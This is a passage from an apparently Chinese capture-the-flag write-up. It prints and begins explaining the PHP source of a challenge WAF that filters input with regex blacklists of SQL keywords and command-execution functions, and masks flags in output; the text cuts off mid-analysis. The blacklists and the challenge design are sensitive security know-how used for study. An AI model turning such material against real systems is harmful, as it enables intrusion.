class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-comment">//config</span><br><span class="hljs-variable">$sql_blacklist</span> = <span class="hljs-string">&quot;/drop\s*|dumpfile\s*|INTO FILE\s*|outfile\s*|load_file\s*|multipoint\s*/i&quot;</span>;<br><span class="hljs-variable">$rce_blacklist</span> = <span class="hljs-string">&quot;/(var_dump|str_rot13|serialize|base64_encode|base64_decode|strrev|eval|assert|file_put_contents|fwrite|curl_exec|passthru|exec|dl|readlink|popepassthru|preg_replace|create_function|array_map|call_user_func|call_user_func_array|array_filter|usort|stream_socket_server|pcntl_exec|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|ini_set|LD_PRELOAD|ini_alter|ini_restore|ini_set)\s*\(/i&quot;</span>;<br><span class="hljs-variable">$key_blacklist</span>=<span class="hljs-string">&quot;/_GET|_POST|_COOKIE|_FILE|_SERVER|_SESSION|flag|waf/i&quot;</span>;<br><br><span class="hljs-variable">$config2333</span>=[<br>    <span class="hljs-string">&quot;cachestore&quot;</span>=&gt;<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;flagFormat&quot;</span>=&gt;<span class="hljs-string">&quot;ROIS&quot;</span>,<span class="hljs-comment">//=&gt; /ROIS&#123;643124e14ecfc643124e14ecff&#125;/i</span><br>    <span class="hljs-string">&quot;filterFunc&quot;</span>=&gt;[<br>        <span class="hljs-string">&quot;fileterOriginFlag&quot;</span>,<br>        <span class="hljs-string">&quot;fileterBase64Flag&quot;</span><br>    ],<br>    <span class="hljs-string">&quot;filterInputRule&quot;</span>=&gt;[<br>        <span class="hljs-variable">$sql_blacklist</span>,<br>        <span class="hljs-variable">$rce_blacklist</span>,<br>        <span class="hljs-variable">$key_blacklist</span><br>    ],<span class="hljs-comment">//filter input</span><br>    <span class="hljs-string">&quot;fileFilter&quot;</span>=&gt;<span class="hljs-literal">true</span><br>];<br><br><span class="hljs-comment">//config ends</span><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>])&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(PHP_OS,<span class="hljs-string">&quot;WIN&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-comment">//Linux</span><br>        <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>]=<span class="hljs-string">&quot;/tmp/cached&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//Windows</span><br>        <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>]=<span class="hljs-string">&quot;cached&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>]);<br>    <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>] = <span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>]);<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CacheWaf</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$config2333</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$config2333</span></span>) </span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;config2333 = <span class="hljs-variable">$config2333</span>;<br><br><br>        <span class="hljs-comment">//check cache exists</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">cacheExists</span>(<span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">reqid</span>());<br><br>        <span class="hljs-comment">//filter input</span><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;config2333[<span class="hljs-string">&quot;filterInputRule&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$black_list</span>)&#123;<br>            <span class="hljs-variable">$_GET</span>=<span class="hljs-title function_ invoke__">filter_arr</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-variable">$_GET</span>);<br>            <span class="hljs-variable">$_POST</span>=<span class="hljs-title function_ invoke__">filter_arr</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-variable">$_POST</span>);<br>            <span class="hljs-variable">$_COOKIE</span>=<span class="hljs-title function_ invoke__">filter_arr</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-variable">$_COOKIE</span>);<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt;&amp;<span class="hljs-variable">$value</span>)&#123;<br>                <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">strong_replace</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$value</span>);<br>            &#125;<br>            <span class="hljs-variable">$_SESSION</span>=<span class="hljs-title function_ invoke__">filter_arr</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-variable">$_SESSION</span>);<br>            <span class="hljs-variable">$_FILES</span>=<span class="hljs-title function_ invoke__">filter_arr</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-variable">$_FILES</span>);<br><br>        &#125;<br><br>        <span class="hljs-comment">//filter upload file</span><br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;config2333[<span class="hljs-string">&quot;fileFilter&quot;</span>])&#123;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>)&#123;<br>                        <span class="hljs-variable">$fileCon</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$v</span>);<br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;config2333[<span class="hljs-string">&quot;filterInputRule&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$black_list</span>)&#123;<br>                            <span class="hljs-variable">$fileCon</span> = <span class="hljs-title function_ invoke__">strong_replace</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$fileCon</span>);<br>                        &#125;<br>                        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$v</span>,<span class="hljs-variable">$fileCon</span>);<br>                    &#125;<br><br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-variable">$fileCon</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;config2333[<span class="hljs-string">&quot;filterInputRule&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$black_list</span>)&#123;<br>                        <span class="hljs-variable">$fileCon</span> = <span class="hljs-title function_ invoke__">strong_replace</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$fileCon</span>);<br>                    &#125;<br>                    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$value</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$fileCon</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//cache start</span><br><br>        <span class="hljs-title function_ invoke__">ob_start</span>(<span class="hljs-string">&quot;cacheCtrl&quot;</span>);<br><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        @<span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cacheExists</span>(<span class="hljs-params"><span class="hljs-variable">$reqid</span></span>)</span>&#123;<br>        <span class="hljs-variable">$cacheFilePath</span>=<span class="hljs-variable language_">$this</span>-&gt;config2333[<span class="hljs-string">&quot;cachestore&quot;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$reqid</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$cacheFilePath</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$cacheFilePath</span>));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reqid</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_COOKIE</span>;<br>        <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>;<br>        <span class="hljs-variable">$requri</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_NAME&quot;</span>];<br>        <span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br>        <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;<br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>)&#123;<br>                    <span class="hljs-variable">$fileCon</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$v</span>);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$fileCon</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>            &#125;<br>            <span class="hljs-variable">$file</span>.=<span class="hljs-variable">$fileCon</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">sort</span>(<span class="hljs-variable">$cookie</span>);<br>        <span class="hljs-title function_ invoke__">sort</span>(<span class="hljs-variable">$get</span>);<br>        <span class="hljs-variable">$idcon</span>=<span class="hljs-variable">$requri</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-variable">$cookie</span>).<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-variable">$get</span>).<span class="hljs-variable">$post</span>.<span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$idcon</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fileterOriginFlag</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$flagFormat</span></span>)</span>&#123;<br>    <span class="hljs-variable">$buffer</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$flagFormat</span>.<span class="hljs-string">&quot;&#123;.*&#125;/im&quot;</span>,<br>        <span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$buffer</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$buffer</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fileterBase64Flag</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$flagFormat</span></span>)</span>&#123;<br>    <span class="hljs-variable">$base64flag</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$flagFormat</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-string">&quot;==&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$base64flag</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">3</span>);<br>    &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-string">&quot;=&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$base64flag</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$base64flag</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$buffer</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#<span class="hljs-subst">$base64flag</span>&quot;</span>.<span class="hljs-string">&quot;[0-9a-zA-Z/+]+#&quot;</span>,<br>            <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$fakeflag</span>),<span class="hljs-variable">$buffer</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$buffer</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">strong_replace</span> (<span class="hljs-params"><span class="hljs-variable">$rule</span>,<span class="hljs-variable">$replace</span>,<span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>        <span class="hljs-variable">$tmpstr</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$rule</span>,<span class="hljs-variable">$replace</span>,<span class="hljs-variable">$str</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$tmpstr</span> === <span class="hljs-variable">$str</span>)&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$tmpstr</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_arr</span>(<span class="hljs-params"><span class="hljs-variable">$rule</span>,<span class="hljs-variable">$arr</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>===<span class="hljs-literal">null</span>)<span class="hljs-keyword">return</span> <span class="hljs-variable">$arr</span>;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>)&#123;<br>        <span class="hljs-comment">//filter $key</span><br>        <span class="hljs-variable">$tmpkey</span>=<span class="hljs-title function_ invoke__">strong_replace</span>(<span class="hljs-variable">$rule</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$key</span>);<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$val</span>))&#123;<br>            <span class="hljs-variable">$tmpval</span> = <span class="hljs-title function_ invoke__">filter_arr</span>(<span class="hljs-variable">$rule</span>,<span class="hljs-variable">$val</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$tmpval</span> = <span class="hljs-title function_ invoke__">strong_replace</span>(<span class="hljs-variable">$rule</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$val</span>);<br>        &#125;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$key</span>]);<br><br>        <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$tmpkey</span>] =  <span class="hljs-variable">$tmpval</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$arr</span>;<br><br>&#125;<br><br><br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cacheCtrl</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span></span>) </span>&#123;<br>    <span class="hljs-comment">//filter output</span><br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>]));<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$config2333</span>;<br>    <span class="hljs-variable">$uniqid</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-title function_ invoke__">uniqid</span>();<br>    <span class="hljs-variable">$fakeflag</span> = <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;flagFormat&quot;</span>].<span class="hljs-string">&quot;&#123;<span class="hljs-subst">&#123;$uniqid&#125;</span>&#125;&quot;</span>;<br>    <span class="hljs-variable">$flagFormat</span> = <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;flagFormat&quot;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;filterFunc&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$filter</span>)&#123;<br>        <span class="hljs-variable">$buffer</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$flagFormat</span>);<br>    &#125;<br><br><br>    <span class="hljs-comment">//cahce</span><br>    <span class="hljs-variable">$cacheFilePath</span>=<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title class_">CacheWaf</span>::<span class="hljs-title function_ invoke__">reqid</span>();<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$cacheFilePath</span>,<span class="hljs-variable">$buffer</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$buffer</span>;<br><br>&#125;<br><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$cache23333</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$cache23333</span> === <span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-variable">$cache23333</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheWaf</span>(<span class="hljs-variable">$config2333</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>开幕雷击只能说是，一开头就被ban掉了一堆东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql_blacklist</span> = <span class="hljs-string">&quot;/drop\s*|dumpfile\s*|INTO FILE\s*|outfile\s*|load_file\s*|multipoint\s*/i&quot;</span>;<br><span class="hljs-variable">$rce_blacklist</span> = <span class="hljs-string">&quot;/(var_dump|str_rot13|serialize|base64_encode|base64_decode|strrev|eval|assert|file_put_contents|fwrite|curl_exec|passthru|exec|dl|readlink|popepassthru|preg_replace|create_function|array_map|call_user_func|call_user_func_array|array_filter|usort|stream_socket_server|pcntl_exec|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|ini_set|LD_PRELOAD|ini_alter|ini_restore|ini_set)\s*\(/i&quot;</span>;<span class="hljs-comment">#rce防火墙</span><br><span class="hljs-variable">$key_blacklist</span>=<span class="hljs-string">&quot;/_GET|_POST|_COOKIE|_FILE|_SERVER|_SESSION|flag|waf/i&quot;</span>;<span class="hljs-comment">#关键字防火墙,，&quot;flag&quot;、&quot;waf&quot;均被ban</span><br></code></pre></td></tr></table></figure><p>定义了一个配置数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$config2333</span>=[<br>    <span class="hljs-string">&quot;cachestore&quot;</span>=&gt;<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;flagFormat&quot;</span>=&gt;<span class="hljs-string">&quot;ROIS&quot;</span>,<span class="hljs-comment">//=&gt; /ROIS&#123;643124e14ecfc643124e14ecff&#125;/i</span><br>    <span class="hljs-string">&quot;filterFunc&quot;</span>=&gt;[<br>        <span class="hljs-string">&quot;fileterOriginFlag&quot;</span>,<br>        <span class="hljs-string">&quot;fileterBase64Flag&quot;</span><br>    ],<br>    <span class="hljs-string">&quot;filterInputRule&quot;</span>=&gt;[<br>        <span class="hljs-variable">$sql_blacklist</span>,<br>        <span class="hljs-variable">$rce_blacklist</span>,<br>        <span class="hljs-variable">$key_blacklist</span><br>    ],<span class="hljs-comment">//filter input</span><br>    <span class="hljs-string">&quot;fileFilter&quot;</span>=&gt;<span class="hljs-literal">true</span><br>];<br></code></pre></td></tr></table></figure><p>看到了可疑内容filterFunc(过滤方法)和filterInputRule(过滤输入)，先看下filterFunc里的两个函数分别干啥的吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fileterOriginFlag</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$flagFormat</span></span>)</span>&#123;<span class="hljs-comment">#line127</span><br>    <span class="hljs-variable">$buffer</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$flagFormat</span>.<span class="hljs-string">&quot;&#123;.*&#125;/im&quot;</span>,<br>        <span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$buffer</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$buffer</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>fileterOriginFlag(过滤原flag):传入$buffer、$fakeflag、$flagFormat，$flagFormat是”ROIS”。preg_replace()中的内容也就是把$buffer中ROIS{.*}形式的替换成假flag然后将返回的假flag赋值给$buffer，最终函数返回$buffer。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fileterBase64Flag</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$flagFormat</span></span>)</span>&#123;<span class="hljs-comment">#line133</span><br>    <span class="hljs-variable">$base64flag</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$flagFormat</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-string">&quot;==&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$base64flag</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">3</span>);<br>    &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-string">&quot;=&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$base64flag</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$base64flag</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$buffer</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#<span class="hljs-subst">$base64flag</span>&quot;</span>.<span 